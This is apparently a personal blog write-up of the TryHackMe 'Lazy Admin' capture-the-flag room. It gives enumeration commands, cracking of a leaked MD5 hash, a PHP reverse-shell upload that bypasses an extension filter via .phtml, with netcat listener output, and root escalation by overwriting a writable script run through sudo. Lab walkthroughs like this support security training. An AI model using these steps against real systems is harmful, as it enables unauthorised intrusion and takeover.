---
layout: post
title: Lazy Admin
subtitle: TryHackME - Lazy Admin
description: Enumerate services, scan ports, exploit vulnerabilities, and escalate privileges to capture flags.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg
tags:
  - TryHackME
  - enum web 
  - brute force
  - Privilege Escalation
  - Find Flags
author: Mustafa Altayeb
date: 2025-10-16 00:00
paginate: true
---

# Lazy Admin

[Lazy Admin](https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg)

## Objectives

1. Enumerate ports
2. Enumerate HTTP
3. Brute force with gobuster
4. Gain access with an upload shell
5. Privilege escalation
6. Capture 2 flags

## Reconnaissance

### Nmap Scan

Port scan:

```bash
nmap -p- -sCV -T4 10.10.112.250
```

```js
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protoc
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings**:

* **Port 22**: SSH service, version 7.2p2
* **Port 80**: Apache httpd

## Web Enumeration

![](/assets/TryHackMeRoomsImage/LazyAdmin/image.png)

## Gobuster

Gobuster may find special directories.

> **gobuster dir --url [http://10.10.112.250](http://10.10.112.250) -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt**

**Result**

```js
/content              (Status: 301) [Size: 316] [--> http://10.10.112.250/content/]  
```

![](/assets/TryHackMeRoomsImage/LazyAdmin/image2.png)

**Findings**:

* it uses SweetRice as a management system

let's enum this directory:

> **gobuster dir --url [http://10.10.112.250/content](http://10.10.112.250/content) -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt**

**findings**:

```js
/images               (Status: 301) [Size: 323] [--> http://10.10.112.250/content/images/]                                                          
/js                   (Status: 301) [Size: 319] [--> http://10.10.112.250/content/js/]                                                              
/inc                  (Status: 301) [Size: 320] [--> http://10.10.112.250/content/inc/]                                                             
/as                   (Status: 301) [Size: 319] [--> http://10.10.112.250/content/as/]                                                              
/_themes              (Status: 301) [Size: 324] [--> http://10.10.112.250/content/_themes/]                                                         
/attachment           (Status: 301) [Size: 327] [--> http://10.10.112.250/content/attachment/]   
```

in `/inc` : found MySQL backup:

![](/assets/TryHackMeRoomsImage/LazyAdmin/image3.png)

in `/as` : found login page:

![](/assets/TryHackMeRoomsImage/LazyAdmin/image4.png)

after downloading the SQL backup i found login credentials:

```
username : manager
hash (MD5) : 42f749ade7f9e195bf475f37a44cafcb
```

### crack hash with john

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
```

password: `Password123`

login with these credentials `username: manager` && `Password: Password123`

after login i find a tab called **Media Access**:

![](/assets/TryHackMeRoomsImage/LazyAdmin/image5.png)

## Gain Access

using [pentestmonkey php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and updating the IP and port, then start listener with netcat:

```bash
nc -nlvp 9090
```

i tried to upload `.php` but extension not approved; uploading `.phtml` succeeded:

![](/assets/TryHackMeRoomsImage/LazyAdmin/image6.png)

after clicking the uploaded file i gained a shell:

```text
💻  T4T4R1S  🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
👀  ➜ ~/thm_machines/LazyAdmin  nc -nlvp 9090                  
listening on [any] 9090 ...
connect to [10.14.109.66] from (UNKNOWN) [10.10.112.250] 49668
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 15:47:29 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

## Upgrade shell using python

> **$ python -c 'import pty; pty.spawn("/bin/bash")'**

```js
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@THM-Chal:/$ 
```

## user flag

```bash
www-data@THM-Chal:/home/itguy$ cat user.txt
THM{63e5bce927..............}
```

# Privilege escalation

when i enumerated the system i used `sudo -l` to know what can i run:

```js
www-data@THM-Chal:/home/itguy$ sudo -l 
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$
```

* i can run `/usr/bin/perl /home/itguy/backup.pl` as root without password.

after checking, `backup.pl` runs `/etc/copy.sh` and `/etc/copy.sh` is writable:

```text
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

i replaced `/etc/copy.sh` with a command to spawn bash as root:

```bash
www-data@THM-Chal:/home/itguy$ echo "/bin/bash" > /etc/copy.sh
```

then i executed the backup script via sudo to get root:

```bash
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
root@THM-Chal:/home/itguy# whoami
root
```

## Root flag

```bash
root@THM-Chal:/home/itguy# cd ~
root@THM-Chal:~# cat root.txt
THM{6637f41d0177b6f37cb2........f}
```

Finished. Happy hacking!

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

Follow me:

* [LinkedIn](https://www.linkedin.com/in/t4t4r1s/)
* [X](https://x.com/T4T4R1S)

---

\